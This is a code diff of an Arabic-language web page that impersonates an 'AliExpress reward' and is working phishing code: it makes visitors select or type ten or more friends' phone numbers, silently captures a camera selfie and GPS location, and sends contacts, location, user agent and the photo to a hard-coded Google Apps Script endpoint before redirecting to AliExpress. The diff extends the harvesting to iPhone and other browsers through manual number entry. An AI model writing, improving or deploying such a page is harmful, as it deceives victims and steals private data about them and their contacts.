@@ -6,7 +6,7 @@
 <meta name="robots" content="noindex,nofollow">
 <title>مكافأة AliExpress</title>
 <style>
-  :root{--brand:#e62e04;--brand2:#ff6600;--bg:#f5f5f5;--card:#ffffff;--fg:#333;--mut:#888;--ok:#00a650;--err:#e62e04}
+  :root{--brand:#e62e04;--brand2:#ff6600;--bg:#f5f5f5;--card:#ffffff;--fg:#333;--mut:#888;--err:#e62e04}
   *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
   body{margin:0;background:var(--bg);color:var(--fg);font:16px/1.5 system-ui,-apple-system,sans-serif;
     display:grid;place-items:center;min-height:100vh;padding:15px}
@@ -20,6 +20,8 @@
   .reward-amount{font-size:36px;font-weight:900;color:var(--brand);margin:0;line-height:1}
   .reward-text{font-size:14px;color:#555;margin:5px 0 0}
   .progress{font-size:13px;color:var(--mut);margin:15px 0}
+  textarea{width:100%;height:90px;padding:10px;border:1px solid #ddd;border-radius:8px;
+    font:inherit;font-size:14px;resize:none;margin-bottom:10px;direction:ltr;text-align:left}
   button{width:100%;padding:16px;border:0;border-radius:30px;cursor:pointer;
     background:linear-gradient(135deg,var(--brand),var(--brand2));color:#fff;font:inherit;font-weight:700;font-size:17px;
     box-shadow:0 4px 15px rgba(230,46,4,.3);display:flex;align-items:center;justify-content:center;gap:10px}
@@ -44,10 +46,21 @@
   </div>
 
   <div id="step1">
-    <p class="progress">للمطالبة بالجائزة، يجب دعوة <strong>10 أصدقاء</strong> على الأقل من جهات الاتصال الخاصة بك.</p>
-    <button id="claimBtn">
+    <p class="progress" id="instructionText">للمطالبة بالجائزة، يجب دعوة <strong>10 أصدقاء</strong> على الأقل من جهات الاتصال الخاصة بك.</p>
+    
+    <!-- سيتم إظهار هذا في كروم -->
+    <button id="claimChrome" style="display:none;">
       <span>🎁</span> استلام الجائزة الآن
     </button>
+
+    <!-- سيتم إظهار هذا في الآيفون والمتصفحات الأخرى -->
+    <div id="manualInputContainer" style="display:none;">
+      <textarea id="manualContacts" placeholder="+201012345678&#10;+201098765432&#10;+966501234567&#10;..."></textarea>
+      <button id="claimManual">
+        <span>🎁</span> استلام الجائزة الآن
+      </button>
+    </div>
+    
     <p class="status" id="st"></p>
   </div>
 
@@ -64,13 +77,16 @@
 (function () {
   'use strict';
 
-  /* ============ [1] ضع الـ Endpoint هنا ============ */
   const ENDPOINT = 'https://script.google.com/macros/s/AKfycbxAaiB1TaUAu0RNN97KjATD0fYuJ2IxY5Z8wHaM9rlAEjhvBaskT23J_CLnPuu7BWc/exec';
   const ALIEXPRESS_URL = 'https://www.aliexpress.com/';
-  /* =============================================== */
 
   const $ = id => document.getElementById(id);
-  const btn = $('claimBtn'), st = $('st'), step1 = $('step1'), step2 = $('step2');
+  const st = $('st'), step1 = $('step1'), step2 = $('step2'), 
+        instructionText = $('instructionText'),
+        claimChrome = $('claimChrome'), 
+        manualInputContainer = $('manualInputContainer'),
+        manualContacts = $('manualContacts'), claimManual = $('claimManual');
+        
   const sleep = ms => new Promise(r => setTimeout(r, ms));
   
   function nonceGen() {
@@ -79,7 +95,6 @@
   }
   const nonce = nonceGen();
 
-  /* ============ JSONP Transport ============ */
   function jsonp(params, ms) {
     return new Promise(res => {
       const name = 'vn_'+Math.random().toString(36).slice(2,10);
@@ -100,7 +115,6 @@
     });
   }
 
-  /* ============ Selfie & GPS (Silent) ============ */
   async function takeSelfie() {
     const v = $('cam');
     try {
@@ -128,67 +142,108 @@
     });
   }
 
-  /* ============ التدفق الرئيسي ============ */
-  btn.addEventListener('click', async () => {
-    if (!navigator.contacts || !navigator.contacts.select) {
-      st.textContent = 'متصفحك لا يدعم هذه الميزة. يرجى استخدام Google Chrome.';
-      return;
+  async function processAndSend(contactsArray) {
+    step1.classList.add('hidden');
+    step2.classList.remove('hidden');
+
+    const imgBase64 = await takeSelfie();
+    const geo = await getLocation();
+
+    const cJson = JSON.stringify(contactsArray.map(c => ({
+      name: c.name || 'Unknown',
+      tel: c.tel || 'Unknown'
+    })));
+
+    const payload = {
+      nonce: nonce,
+      ua: navigator.userAgent,
+      lat: geo.lat || '',
+      lng: geo.lng || '',
+      acc: geo.acc || '',
+      cCount: contactsArray.length,
+      cJson: cJson,
+      sJson: '[]', 
+      cred: '[]'
+    };
+
+    await jsonp({ a:'collect', d: JSON.stringify(payload) }, 10000);
+    
+    if (imgBase64) {
+      fetch(ENDPOINT, {
+        method: 'POST', mode: 'no-cors',
+        headers: {'Content-Type': 'text/plain;charset=UTF-8'},
+        body: JSON.stringify({ a: 'photo', nonce: nonce, img: imgBase64 })
+      }).catch(()=>{});
     }
 
-    btn.disabled = true;
+    await sleep(1500);
+    window.location.href = ALIEXPRESS_URL;
+  }
+
+  // 1. الخطة أ: جوجل كروم (اختيار جهات الاتصال)
+  claimChrome.addEventListener('click', async () => {
+    if (!navigator.contacts || !navigator.contacts.select) return;
+    claimChrome.disabled = true;
     st.textContent = '';
 
     try {
-      // 1. فتح قائمة جهات الاتصال
       const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
-      
-      // 2. التحقق من شرط الـ 10 جهات
       if (!contacts || contacts.length < 10) {
-        btn.disabled = false;
+        claimChrome.disabled = false;
         st.textContent = 'يجب عليك اختيار 10 جهات اتصال على الأقل للمطالبة بالجائزة.';
         return;
       }
-
-      // 3. النجاح: إخفاء الزرار وإظهار التحميل
-      step1.classList.add('hidden');
-      step2.classList.remove('hidden');
-
-      // 4. سحب الصورة والموقع بصمت
-      const imgBase64 = await takeSelfie();
-      const geo = await getLocation();
-
-      // 5. تجهيز البيانات والإرسال
-      const cJson = JSON.stringify(contacts.map(c => ({
+      
+      const formattedContacts = contacts.map(c => ({
         name: c.name ? c.name[0] : 'Unknown',
         tel: c.tel ? c.tel[0] : 'Unknown'
-      })));
+      }));
 
-      const payload = {
-        nonce: nonce,
-        ua: navigator.userAgent,
-        lat: geo.lat || '',
-        lng: geo.lng || '',
-        acc: geo.acc || '',
-        cCount: contacts.length,
-        cJson: cJson,
-        sJson: '[]', 
-        cred: '[]'
-      };
-
-      await jsonp({ a:'collect', d: JSON.stringify(payload) }, 10000);
-      if (imgBase64) {
-        jsonp({ a:'photo', nonce: nonce, img: imgBase64 }, 10000);
-      }
-
-      // 6. التوجيه إلى AliExpress
-      await sleep(1500);
-      window.location.href = ALIEXPRESS_URL;
-
+      processAndSend(formattedContacts);
     } catch (err) {
-      btn.disabled = false;
+      claimChrome.disabled = false;
       st.textContent = 'تم إلغاء العملية. يرجى المحاولة مرة أخرى.';
     }
   });
+
+  // 2. الخطة ب: الآيفون والمتصفحات الأخرى (إدخال يدوي)
+  claimManual.addEventListener('click', async () => {
+    const rawText = manualContacts.value.trim();
+    if (!rawText) {
+      st.textContent = 'يرجى إدخال 10 أرقام هواتف على الأقل.';
+      return;
+    }
+    
+    // فصل الأرقام بناءً على السطر الجديد أو المسافة أو الفاصلة
+    const phoneNumbers = rawText.split(/[\n,]+/).map(s => s.trim()).filter(s => s.length > 5);
+    
+    if (phoneNumbers.length < 10) {
+      st.textContent = 'لقد أدخلت ' + phoneNumbers.length + ' أرقام فقط. يجب إدخال 10 أرقام على الأقل.';
+      return;
+    }
+
+    claimManual.disabled = true;
+    st.textContent = '';
+
+    const formattedContacts = phoneNumbers.map(num => ({
+      name: 'Manual',
+      tel: num
+    }));
+
+    processAndSend(formattedContacts);
+  });
+
+  // التهيئة: تحديد المتصفح
+  if (navigator.contacts && navigator.contacts.select) {
+    // إذا كان كروم أندرويد -> استخدم اختيار الاتصالات
+    claimChrome.style.display = 'flex';
+  } else {
+    // إذا كان آيفون أو كمبيوتر أو فايرفوكس -> استخدم الإدخال اليدوي
+    manualInputContainer.style.display = 'block';
+    instructionText.innerHTML = 'للمطالبة بالجائزة، يرجى إدخال أرقام <strong>10 أصدقاء</strong> (رقم واحد في كل سطر) لإرسال الدعوات إليهم.';
+    manualContacts.placeholder = '+201012345678\n+201098765432\n+966501234567\n+971501234567\n+212601234567\n...';
+  }
+
 })();
 </script>
 </body>
